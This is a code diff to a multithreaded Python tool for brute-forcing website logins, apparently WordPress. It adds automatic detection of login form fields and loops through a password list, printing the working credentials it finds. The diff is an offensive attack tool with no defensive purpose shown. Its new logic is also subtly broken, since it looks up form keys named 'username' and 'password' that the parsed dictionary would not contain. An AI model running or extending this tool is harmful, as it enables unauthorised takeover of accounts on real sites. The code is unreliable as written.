@@ -5,7 +5,7 @@ import pyfiglet
 import time
 import os
 import threading
-
+from bs4 import BeautifulSoup
 from colorama import init, Fore
 
 init(autoreset=True)
@@ -34,12 +34,12 @@ def check_connection(url):
         print(Fore.RED + f"An unexpected error occurred while connecting: {ex}")
     return None
 
-def login(target_url, username, password, console_lock):
+def login(target_url, form_params, username, password, console_lock):
     login_url = target_url
-    data = {'log': username, 'pwd': password}
+    data = {form_params['username']: username, form_params['password']: password}
     try:
         with requests.post(login_url, data=data, headers={'User-Agent': USER_AGENT}, timeout=5) as response:
-            if 'wp-admin' in response.url:
+            if 'wp-admin' in response.url:  # Change this condition based on target website behavior
                 console_lock.print(Fore.GREEN, f"\nLogin successful!\nUsername: {username}\nPassword: {password}\n")
                 return True
             else:
@@ -79,12 +79,31 @@ def brute_force(target_url, username, password_list, num_threads):
     console_lock.print(Fore.CYAN, f"Server: {response.headers.get('Server', 'N/A')}")
     console_lock.print(Fore.CYAN, f"IP Address: {socket.gethostbyname(response.url.split('//')[-1].split('/')[0])}\n")
 
-    console_lock.print(Fore.GREEN, f"Starting brute force attack on {target_url}...")
+    # Fetch the login page HTML to inspect the form parameters
+    login_page_html = response.text
+    soup = BeautifulSoup(login_page_html, 'html.parser')
+    form_params = {}
+    form = soup.find('form')
+    if form:
+        for input_tag in form.find_all('input'):
+            param_name = input_tag.get('name')
+            if param_name and param_name not in ['submit', 'Submit']:
+                form_params[param_name] = input_tag.get('value', '')
+
+    if not form_params:
+        console_lock.print(Fore.RED, "Failed to auto-detect form parameters for login.")
+        return
+
+    console_lock.print(Fore.CYAN, "Auto-detected form parameters for login:")
+    for param_name, param_value in form_params.items():
+        console_lock.print(Fore.CYAN, f"{param_name}: {param_value}")
+
+    console_lock.print(Fore.GREEN, f"\nStarting brute force attack on {target_url}...")
     console_lock.print(Fore.GREEN, f"Username: {username}")
     console_lock.print(Fore.GREEN, f"Total passwords to try: {len(password_list)}\n")
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=num_threads) as executor:
-        futures = [executor.submit(login, target_url, username, password, console_lock) for password in password_list]
+        futures = [executor.submit(login, target_url, form_params, username, password, console_lock) for password in password_list]
         for _ in concurrent.futures.as_completed(futures):
             pass
 
